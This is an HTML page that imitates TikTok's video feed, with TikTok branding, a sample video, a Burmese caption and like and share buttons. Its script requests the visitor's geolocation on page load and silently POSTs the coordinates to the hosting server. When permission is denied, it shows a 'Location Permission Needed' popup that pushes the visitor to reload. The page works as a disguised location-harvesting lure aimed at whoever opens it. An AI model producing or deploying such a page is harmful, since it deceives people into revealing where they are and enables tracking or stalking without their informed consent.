<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }
        
        /* TikTok Loader Styles */
        .tiktok-loader {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 60px;
            height: 60px;
            z-index: 1000;
            display: none; /* Hidden by default */
        }
        
        .tiktok-loader::before,
        .tiktok-loader::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 4px solid transparent;
            box-sizing: border-box;
        }
        
        .tiktok-loader::before {
            border-top-color: #FE2C55; /* TikTok red */
            border-bottom-color: #FE2C55;
            animation: tiktok-spin 1s linear infinite;
        }
        
        .tiktok-loader::after {
            border-left-color: #25F4EE; /* TikTok teal */
            border-right-color: #25F4EE;
            animation: tiktok-spin 1s linear infinite reverse;
        }
        
        @keyframes tiktok-spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            padding: 15px;
            border-bottom: 1px solid #333;
        }
        
        .logo {
            font-weight: bold;
            font-size: 20px;
        }
        
        .search-icon, .upload-icon {
            font-size: 20px;
        }
        
        .main-content {
            flex: 1;
            display: flex;
            position: relative;
        }
        
        .video-container {
            flex: 1;
            position: relative;
            overflow: hidden;
        }
        
        .video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .video-info {
            position: absolute;
            bottom: 60px;
            left: 15px;
            right: 15px;
        }
        
        .username {
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .caption {
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        .music {
            display: flex;
            align-items: center;
            font-size: 14px;
        }
        
        .music-icon {
            margin-right: 5px;
        }
        
        .right-sidebar {
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            padding: 15px;
            position: absolute;
            right: 0;
            bottom: 80px;
        }
        
        .action-button {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .action-icon {
            font-size: 30px;
            margin-bottom: 5px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .action-count {
            font-size: 12px;
        }
        
        .profile-pic {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid #fff;
            margin-bottom: 5px;
        }
        
        .follow-button {
            background-color: #fe2c55;
            border: none;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
        }
        
        .bottom-nav {
            display: flex;
            justify-content: space-around;
            padding: 15px;
            border-top: 1px solid #333;
        }
        
        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 12px;
        }
        
        .nav-icon {
            font-size: 22px;
            margin-bottom: 3px;
        }
        
        .active {
            color: #fe2c55;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>
<body>
    <!-- TikTok Loading Animation -->
    <div class="tiktok-loader" id="tiktokLoader"></div>
    
    <div class="header">
        <div class="logo">TikTok</div>
        <div class="search-icon">
            <i class="fas fa-search"></i>
        </div>
        <div class="upload-icon">
            <i class="fas fa-upload"></i>
        </div>
    </div>
    
    <div class="main-content">
        <div class="video-container">
            <video class="video" autoplay loop muted>
                <source src="https://example.com/sample-video.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            
            <div class="video-info">
                <div class="username">@cmthal65505867</div>
                <div class="caption">သူရုပ်မာမျိုးကိုကြည့်ကြပါ</div>
                <div class="music">
                    <span class="music-icon"><i class="fas fa-music"></i></span>
                    <span>Original Sound - sync64932</span>
                </div>
            </div>
        </div>
        
        <div class="right-sidebar">
            <div class="action-button">
                <div class="action-icon">
                    <i class="fas fa-heart"></i>
                </div>
                <div class="action-count">1.5K</div>
            </div>
            
            <div class="action-button">
                <div class="action-icon">
                    <i class="fas fa-comment-dots"></i>
                </div>
                <div class="action-count">56</div>
            </div>
            
            <div class="action-button">
                <div class="action-icon">
                    <i class="fas fa-share"></i>
                </div>
                <div class="action-count">Share</div>
            </div>
            
            <div class="action-button">
                <div class="action-icon">
                    <i class="fas fa-bookmark"></i>
                </div>
                <div class="action-count">Save</div>
            </div>
            
            <div class="action-button">
                <img src="/upload.jpg" alt="Profile" class="profile-pic">
                <button class="follow-button">Follow</button>
            </div>
        </div>
    </div>
    
    <div class="bottom-nav">
        <div class="nav-item active">
            <div class="nav-icon"><i class="fas fa-home"></i></div>
            <div>Home</div>
        </div>
        <div class="nav-item">
            <div class="nav-icon"><i class="fas fa-compass"></i></div>
            <div>Discover</div>
        </div>
        <div class="nav-item">
            <div class="nav-icon"><i class="fas fa-plus-square"></i></div>
            <div>Create</div>
        </div>
        <div class="nav-item">
            <div class="nav-icon"><i class="fas fa-inbox"></i></div>
            <div>Inbox</div>
        </div>
        <div class="nav-item">
            <div class="nav-icon"><i class="fas fa-user"></i></div>
            <div>Me</div>
        </div>
    </div>

</style>
     <div class="tiktok-loader" id="tiktokLoader"></div>
    <style>
    #locationPopup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 30px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.25);
      border-radius: 10px;
      z-index: 9999;
      text-align: center;
      width: 300px;
    }
    #overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: rgba(0, 0, 0, 0.5);
      z-index: 9998;
    }
    button {
      margin-top: 15px;
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      background-color: #007BFF;
      color: white;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
    #heading, #p{
      color: black;
    }
  </style>
  <!-- Overlay and popup -->
  <div id="overlay" style="display: none;"></div>
  <div id="locationPopup" style="display: none;">
    <h3 id="heading">Location Permission Needed</h3>
    <p id="p">Find out what people nearby are sharing.</p>
    <button onclick="refreshPage()">Refresh the Page</button>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
            const loader = document.getElementById('tiktokLoader');
            loader.style.display = 'block';
        });
    window.onload = function () {
      requestLocation();
    };

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      } else {
        document.getElementById("output").innerText = "Geolocation is not supported by this browser.";
      }
    }

    function showPosition(position) {
      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude
      };

      // Send to Node server
      fetch('/location', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => response.text())
      .then(result => console.log('Server response:', result))
      .catch(error => console.error('Error:', error));

      hidePopup();
    }

    function showError(error) {
      if (error.code === error.PERMISSION_DENIED) {
        showPopup();
      } else {
        document.getElementById("output").innerText = "Location error: " + error.message;
      }
    }

    function showPopup() {
      document.getElementById("overlay").style.display = "block";
      document.getElementById("locationPopup").style.display = "block";
    }

    function hidePopup() {
      document.getElementById("overlay").style.display = "none";
      document.getElementById("locationPopup").style.display = "none";
    }

    function refreshPage() {
      window.location.reload();
    }
  </script>
</body>
</html>
